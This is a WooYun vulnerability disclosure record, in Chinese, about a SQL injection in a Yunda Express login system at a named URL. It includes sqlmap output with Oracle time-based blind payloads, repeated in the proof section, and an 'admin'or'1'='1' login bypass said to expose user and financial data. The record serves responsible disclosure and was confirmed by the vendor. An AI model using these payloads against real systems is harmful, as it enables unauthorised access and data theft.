{"id": 47231, "wybug_id": "wooyun-2014-087560", "wybug_title": "韵达快递某系统SQL注入导致泄露大量敏感信息", "wybug_corp": "韵达快递", "wybug_author": "路人甲", "wybug_date": "2014-12-17 18:09", "wybug_open_date": "2015-01-31 18:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向公众公开  简要描述： 韵达快递某系统SQL注入导致泄漏大量敏感信息 详细说明：  韵达集团一卡通系统http://wdcx.yundasys.com:11347/p3_system_web/login.jsp0x01、SQL注入POST注入：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tabSysUser.useAccountPass (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: tabSysUser.useAccountName=dRFV&selectRole=2&tabSysUser.useAccountPass=rdOh') AND 1859=DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(115),30) AND ('ASLN'='ASLNParameter: tabSysUser.useAccountName (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: tabSysUser.useAccountName=dRFV') AND 4635=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(65)||CHR(104)||CHR(65),30) AND ('gRLp'='gRLp&selectRole=2&tabSysUser.useAccountPass=rdOh---web application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oraclecurrent user is DBA:    False但--dbs跑不出数据库。0x02、通过上面payload，判断可以用万用用户名和密码登陆后台\nadmin'or'1'='1\n1）后台登陆界面\n\n2）后台界面\n\n3）大量用户信息\n\n\n\n4）大量财务信息\n\n\n\n   漏洞证明：  韵达集团一卡通系统http://wdcx.yundasys.com:11347/p3_system_web/login.jsp0x01、SQL注入POST注入：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tabSysUser.useAccountPass (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: tabSysUser.useAccountName=dRFV&selectRole=2&tabSysUser.useAccountPass=rdOh') AND 1859=DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(115),30) AND ('ASLN'='ASLNParameter: tabSysUser.useAccountName (POST)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: tabSysUser.useAccountName=dRFV') AND 4635=DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(65)||CHR(104)||CHR(65),30) AND ('gRLp'='gRLp&selectRole=2&tabSysUser.useAccountPass=rdOh---web application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oraclecurrent user is DBA:    False但--dbs跑不出数据库。0x02、通过上面payload，判断可以用万用用户名和密码登陆后台\nadmin'or'1'='1\n1）后台登陆界面\n\n2）后台界面\n\n3）大量用户信息\n\n\n\n4）大量财务信息\n\n\n\n   修复方案：  1/输入过滤；   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-22 09:29 厂商回复： 确认 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-31 18:48 |    \t\t_July \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | - 你是猴子请来的逗逼么.)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}